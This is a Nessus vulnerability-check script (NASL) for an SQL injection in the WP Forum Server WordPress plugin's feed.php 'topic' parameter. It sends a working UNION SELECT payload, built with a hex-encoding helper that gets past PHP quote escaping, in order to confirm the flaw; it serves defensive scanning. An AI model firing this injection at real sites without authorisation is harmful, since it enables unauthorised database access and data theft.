#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(52543);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/11/01 19:59:57 $");

  script_bugtraq_id(46560);
  script_osvdb_id(70994);
  script_xref(name:"EDB-ID", value:"16235");

  script_name(english:"WP Forum Server Plugin for WordPress 'topic' Parameter SQL Injection");
  script_summary(english:"Attempts to generate the feed info for a non-existent topic.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is vulnerable to a SQL
injection attack.");
  script_set_attribute(attribute:"description", value:
"The version of the WP Forum Server plugin for WordPress hosted on the
remote web server fails to sanitize input to the 'topic' parameter of
the 'feed.php' script before using it in a database query.

Regardless of PHP's 'magic_quotes_gpc' setting, an unauthenticated
remote attacker can leverage this issue to manipulate database
queries, leading to the disclosure of sensitive information or attacks
against the underlying database.

Note that this install is also reportedly affected by other SQL
injection vulnerabilities; however, this plugin has not checked for
them.");
  # http://www.htbridge.ch/advisory/sql_injection_in_wp_forum_server_wordpress_plugin.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f3537f2f");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2011/Feb/247");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/plugins/forum-server/changelog/");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.6.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/02/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/03/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/03/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "WP Forum Server";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "forum-server/js/jquery.corner.js"][0] =
    make_list('jQuery corner plugin');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext     : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}

# Try to exploit the issue to generate a SQL error.
magic = SCRIPT_NAME;

exploit = "-" + rand() % 1000 + " UNION SELECT " + hexify(str:magic);
url = dir + '/wp-content/plugins/forum-server/feed.php?' +
  'topic=' + str_replace(find:" ", replace:"%20", string:exploit);

res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

if (
  magic+' </title>' >< res[2] ||
  magic+' </description>' >< res[2]
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

  if (report_verbosity > 0)
  {
    header =
      'Nessus was able to verify the issue by manipulating the title for\n' +
      'a non-existent topic using the following URL :';
    report = get_vuln_report(items:url, port:port, header:header);
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
